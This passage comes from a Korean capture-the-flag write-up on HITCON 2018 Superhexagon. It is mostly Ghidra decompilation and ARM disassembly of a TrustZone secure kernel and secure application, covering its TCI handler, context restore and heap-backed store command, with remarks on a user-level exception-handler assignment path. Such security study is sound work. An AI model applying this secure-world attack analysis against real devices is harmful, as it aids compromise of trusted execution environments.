</span></span><span style="display:flex;"><span>addr1 <span style="color:#f92672">=</span> ext32(buf[<span style="color:#ae81ff">0x14</span>:<span style="color:#ae81ff">0x18</span>])
</span></span><span style="display:flex;"><span>print(hex(addr1), hex(size1))
</span></span><span style="display:flex;"><span>size2 <span style="color:#f92672">=</span> ext32(buf[<span style="color:#ae81ff">0x20</span>:<span style="color:#ae81ff">0x24</span>])
</span></span><span style="display:flex;"><span>addr2 <span style="color:#f92672">=</span> ext32(buf[<span style="color:#ae81ff">0x1c</span>:<span style="color:#ae81ff">0x20</span>])
</span></span><span style="display:flex;"><span>print(hex(addr2), hex(size2))
</span></span><span style="display:flex;"><span>print(hex(<span style="color:#ae81ff">0xff8000</span>), hex(<span style="color:#ae81ff">0x8000</span>))
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#ae81ff">0x1000</span> <span style="color:#ae81ff">0x1000</span> (<span style="color:#ae81ff">0x684</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x2000</span> <span style="color:#ae81ff">0x1000</span> (<span style="color:#ae81ff">0xa8</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x100000</span> <span style="color:#ae81ff">0x82000</span> (<span style="color:#ae81ff">0x81070</span>)
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xff8000</span> <span style="color:#ae81ff">0x8000</span> (<span style="color:#ae81ff">0x8000</span>)
</span></span></code></pre></div><p>위와 같이 매핑한다.
권한은 아래와 같다.
<img loading="lazy" src="/blog/Hitcon_2018_Superhexagon/a0dc084795134a2ff9940e0df33e83df.png" alt=""  />

0x24만큼 헤더가 짤린 SEL0.bin을 기드라에 로드해서 세그먼트 별로 잘라서 로드해주고 분석하면 된다.
다음은 tci call시 호출되는 함수다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined4 <span style="color:#a6e22e">FUN_08000dbe</span>(TCI <span style="color:#f92672">*</span>r1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined4 local_c;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (Entry <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0xffffffff</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((Entry <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      local_c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1d0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      local_c <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1f0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_08001944</span>(<span style="color:#f92672">&amp;</span>ctx,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x3c</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>tci_handle <span style="color:#f92672">=</span> r1;
</span></span><span style="display:flex;"><span>    _DAT_08085040 <span style="color:#f92672">=</span> local_c;
</span></span><span style="display:flex;"><span>    _DAT_0808503c <span style="color:#f92672">=</span> Entry;
</span></span><span style="display:flex;"><span>    ctx.sp._0_1_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf0</span>;
</span></span><span style="display:flex;"><span>    ctx.sp._1_1_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    ctx.sp._2_1_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xff</span>;
</span></span><span style="display:flex;"><span>    ctx.sp._3_1_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_0800187c</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0xffffffff</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>sp를 세팅한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*</span>                           FUNCTION                          
</span></span><span style="display:flex;"><span>                             <span style="color:#f92672">*************************************************************</span>
</span></span><span style="display:flex;"><span>                             undefined  FUN_08001818 (undefined  param_1 , undefined  par
</span></span><span style="display:flex;"><span>             undefined         r0:<span style="color:#ae81ff">1</span>           <span style="color:#f92672">&lt;</span>RETURN<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>             undefined         r0:<span style="color:#ae81ff">1</span>           param_1
</span></span><span style="display:flex;"><span>             undefined         r1:<span style="color:#ae81ff">1</span>           param_2
</span></span><span style="display:flex;"><span>             undefined         r2:<span style="color:#ae81ff">1</span>           param_3
</span></span><span style="display:flex;"><span>             undefined         r3:<span style="color:#ae81ff">1</span>           param_4
</span></span><span style="display:flex;"><span>             undefined         Stack[<span style="color:#ae81ff">0x0</span>]:<span style="color:#ae81ff">1</span>   param_5
</span></span><span style="display:flex;"><span>             undefined         Stack[<span style="color:#ae81ff">0x4</span>]:<span style="color:#ae81ff">1</span>   param_6
</span></span><span style="display:flex;"><span>             undefined         Stack[<span style="color:#ae81ff">0x8</span>]:<span style="color:#ae81ff">1</span>   param_7
</span></span><span style="display:flex;"><span>             undefined         Stack[<span style="color:#ae81ff">0xc</span>]:<span style="color:#ae81ff">1</span>   param_8
</span></span><span style="display:flex;"><span>             undefined         Stack[<span style="color:#ae81ff">0x10</span>]:<span style="color:#ae81ff">1</span>  param_9
</span></span><span style="display:flex;"><span>             undefined         Stack[<span style="color:#ae81ff">0x14</span>]:<span style="color:#ae81ff">1</span>  param_10
</span></span><span style="display:flex;"><span>             undefined4        Stack[<span style="color:#ae81ff">0x34</span>]:<span style="color:#ae81ff">4</span>  param_11                                XREF[<span style="color:#ae81ff">1</span>]:     <span style="color:#ae81ff">08001818</span> (R)   
</span></span><span style="display:flex;"><span>             undefined4        Stack[<span style="color:#ae81ff">0x38</span>]:<span style="color:#ae81ff">4</span>  param_12                                XREF[<span style="color:#ae81ff">1</span>]:     <span style="color:#ae81ff">0800181</span>c (R)   
</span></span><span style="display:flex;"><span>                             FUN_08001818                                    XREF[<span style="color:#ae81ff">1</span>]:     FUN_080015b4:<span style="color:#ae81ff">08001870</span> (c)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001818</span> <span style="color:#ae81ff">34</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        param_1 ,[sp,<span style="color:#75715e">#param_11 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0800181</span>c <span style="color:#ae81ff">38</span>  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        param_2 ,[sp,<span style="color:#75715e">#param_12 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001820</span> <span style="color:#ae81ff">1</span>f  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">02</span>  f1    cps        <span style="color:#75715e">#31</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001824</span> <span style="color:#ae81ff">0</span>d  <span style="color:#ae81ff">20</span>  a0  e1    cpy        param_3 ,sp
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001828</span> <span style="color:#ae81ff">00</span>  d0  a0  e1    cpy        sp,param_1
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0800182</span>c <span style="color:#ae81ff">01</span>  e0  a0  e1    cpy        lr,param_2
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001830</span> <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">02</span>  f1    cps        <span style="color:#75715e">#19</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001834</span> <span style="color:#ae81ff">44</span>  <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">8</span>d  e5    str        param_3 ,[sp,<span style="color:#75715e">#0x44 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001838</span> <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">00</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        param_1 ,[sp,<span style="color:#75715e">#0x0 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0800183</span>c <span style="color:#ae81ff">04</span>  <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        param_2 ,[sp,<span style="color:#75715e">#0x4 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001840</span> <span style="color:#ae81ff">08</span>  <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        param_3 ,[sp,<span style="color:#75715e">#0x8 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001844</span> <span style="color:#ae81ff">0</span>c  <span style="color:#ae81ff">30</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        param_4 ,[sp,<span style="color:#75715e">#0xc ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001848</span> <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">40</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        r4,[sp,<span style="color:#75715e">#0x10 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0800184</span>c <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">50</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        r5,[sp,<span style="color:#75715e">#0x14 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001850</span> <span style="color:#ae81ff">18</span>  <span style="color:#ae81ff">60</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        r6,[sp,<span style="color:#75715e">#0x18 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001854</span> <span style="color:#ae81ff">1</span>c  <span style="color:#ae81ff">70</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        r7,[sp,<span style="color:#75715e">#0x1c ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001858</span> <span style="color:#ae81ff">20</span>  <span style="color:#ae81ff">80</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        r8,[sp,<span style="color:#75715e">#0x20 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0800185</span>c <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">90</span>  <span style="color:#ae81ff">9</span>d  e5    ldr        r9,[sp,<span style="color:#75715e">#0x24 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001860</span> <span style="color:#ae81ff">28</span>  a0  <span style="color:#ae81ff">9</span>d  e5    ldr        r10 ,[sp,<span style="color:#75715e">#0x28 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001864</span> <span style="color:#ae81ff">2</span>c  b0  <span style="color:#ae81ff">9</span>d  e5    ldr        r11 ,[sp,<span style="color:#75715e">#0x2c ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001868</span> <span style="color:#ae81ff">30</span>  c0  <span style="color:#ae81ff">9</span>d  e5    ldr        r12 ,[sp,<span style="color:#75715e">#0x30 ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0800186</span>c <span style="color:#ae81ff">1</span>e  ff  <span style="color:#ae81ff">2</span>f  e1    bx         lr
</span></span><span style="display:flex;"><span>                             LAB_08001870                                    XREF[<span style="color:#ae81ff">1</span>]:     FUN_0800187c:<span style="color:#ae81ff">08001888</span> (j)   
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001870</span> e8  ff  ff  eb    bl         FUN_08001818                                     undefined FUN_08001818(undefined
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001874</span> <span style="color:#ae81ff">3</span>c  e0  <span style="color:#ae81ff">9</span>d  e5    ldr        lr,[sp,<span style="color:#75715e">#0x3c ]</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">08001878</span> <span style="color:#ae81ff">0</span>e  f0  b0  e1    movs       pc,lr
</span></span></code></pre></div><p>hdr[0x8:12]는 0x126b로 S-EL0의 entrypoint라고 볼 수 있다.
S-EL0의 context를 복구하고 여기로 pc에 entrypoint를 넣는다.
tci handle도 특정 부분에 기록되어서 S-EL0로 넘어간다.</p>
<h1 id="s-el0-secure-application">S-EL0, Secure application<a hidden class="anchor" aria-hidden="true" href="#s-el0-secure-application">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_0000126a</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  code <span style="color:#f92672">*</span>UNRECOVERED_JUMPTABLE;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_0000122c</span>(tci_handle);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Could not recover jumptable at 0x00001288. Too many branches */</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Treating indirect jump as call */</span>
</span></span><span style="display:flex;"><span>  (<span style="color:#f92672">*</span>UNRECOVERED_JUMPTABLE)();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>엔트리 포인트부터 확인해보면 S-EL1에서 기록한 tci_handle을 넘겨받는 것을 확인할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_0000122c</span>(TCI <span style="color:#f92672">*</span>tci_handle_arg)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  code <span style="color:#f92672">*</span>UNRECOVERED_JUMPTABLE;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">interrupt_kernel</span>(<span style="color:#ae81ff">0xb</span>,<span style="color:#ae81ff">0x1001</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (tci_handle_arg<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* load */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_0000104e</span>(tci_handle_arg);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (tci_handle_arg<span style="color:#f92672">-&gt;</span>cmd <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* store */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">FUN_000010f6</span>(tci_handle_arg);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  UNRECOVERED_JUMPTABLE <span style="color:#f92672">=</span> FUN_0000126a <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_0000166c</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">FUN_0000122c</span>(tci_handle);
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Could not recover jumptable at 0x00001288. Too many branches */</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Treating indirect jump as call */</span>
</span></span><span style="display:flex;"><span>  (<span style="color:#f92672">*</span>UNRECOVERED_JUMPTABLE)();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>내부적으로 store 함수에서 custom heap allocator를 이용한다.
software_interrupt1은 S-EL1에서 svc 뒤에 나오는 숫자를 추출해서, S-EL1의 software interrupt handler에서 호출하는 함수 포인터에 대한 대입 연산을 수행해서 user level에서의 exception handler 할당이 가능하다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">FUN_000010f6</span>(TCI <span style="color:#f92672">*</span>param_1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  undefined4 local_64;
</span></span><span style="display:flex;"><span>  undefined4 uStack_60;
</span></span><span style="display:flex;"><span>  undefined4 uStack_5c;
</span></span><span style="display:flex;"><span>  undefined4 uStack_58;
</span></span><span style="display:flex;"><span>  undefined4 local_54;
</span></span><span style="display:flex;"><span>  undefined4 uStack_50;
</span></span><span style="display:flex;"><span>  undefined4 uStack_4c;
</span></span><span style="display:flex;"><span>  undefined4 uStack_48;
</span></span><span style="display:flex;"><span>  undefined4 local_44;
</span></span><span style="display:flex;"><span>  undefined4 uStack_40;
</span></span><span style="display:flex;"><span>  undefined4 uStack_3c;
</span></span><span style="display:flex;"><span>  undefined4 uStack_38;
</span></span><span style="display:flex;"><span>  undefined2 local_34;
</span></span><span style="display:flex;"><span>  undefined4 local_30;
</span></span><span style="display:flex;"><span>  undefined4 uStack_2c;
</span></span><span style="display:flex;"><span>  undefined4 uStack_28;
</span></span><span style="display:flex;"><span>  undefined4 uStack_24;
</span></span><span style="display:flex;"><span>  undefined4 local_20;
</span></span><span style="display:flex;"><span>  undefined2 uStack_1c;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> cStack_1a;
</span></span><span style="display:flex;"><span>  uint local_18;
</span></span><span style="display:flex;"><span>  uint idx;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  idx <span style="color:#f92672">=</span> param_1<span style="color:#f92672">-&gt;</span>index;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">10</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (UINT_ARRAY_00100000[idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)UINT_ARRAY_00100000[idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]);
</span></span><span style="display:flex;"><span>      UINT_ARRAY_00100000[idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>(undefined4 <span style="color:#f92672">*</span>)(idx <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100000</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    local_18 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(param_1<span style="color:#f92672">-&gt;</span>size);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_18 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
</span></span><span style="display:flex;"><span>      local_64._0_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>      local_64._1_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>      local_64._2_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>      local_64._3_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">3</span>];
</span></span><span style="display:flex;"><span>      uStack_60._0_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>      uStack_60._1_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">5</span>];
</span></span><span style="display:flex;"><span>      uStack_60._2_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">6</span>];
</span></span><span style="display:flex;"><span>      uStack_60._3_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">7</span>];
</span></span><span style="display:flex;"><span>      uStack_5c._0_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">8</span>];
</span></span><span style="display:flex;"><span>      uStack_5c._1_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">9</span>];
</span></span><span style="display:flex;"><span>      uStack_5c._2_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">10</span>];
</span></span><span style="display:flex;"><span>      uStack_5c._3_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">11</span>];
</span></span><span style="display:flex;"><span>      uStack_58._0_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">12</span>];
</span></span><span style="display:flex;"><span>      uStack_58._1_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">13</span>];
</span></span><span style="display:flex;"><span>      uStack_58._2_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">14</span>];
</span></span><span style="display:flex;"><span>      uStack_58._3_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">15</span>];
</span></span><span style="display:flex;"><span>      local_54._0_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">16</span>];
</span></span><span style="display:flex;"><span>      local_54._1_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">17</span>];
</span></span><span style="display:flex;"><span>      local_54._2_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">18</span>];
</span></span><span style="display:flex;"><span>      local_54._3_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">19</span>];
</span></span><span style="display:flex;"><span>      uStack_50._0_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">20</span>];
</span></span><span style="display:flex;"><span>      uStack_50._1_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">21</span>];
</span></span><span style="display:flex;"><span>      uStack_50._2_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">22</span>];
</span></span><span style="display:flex;"><span>      uStack_50._3_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">23</span>];
</span></span><span style="display:flex;"><span>      uStack_4c._0_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">24</span>];
</span></span><span style="display:flex;"><span>      uStack_4c._1_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">25</span>];
</span></span><span style="display:flex;"><span>      uStack_4c._2_1_ <span style="color:#f92672">=</span> <span style="color:#a6e22e">s_assert</span>((ptr_<span style="color:#f92672">=</span><span style="color:#a6e22e">_</span>(uint8_t_<span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(_00002070[<span style="color:#ae81ff">26</span>];
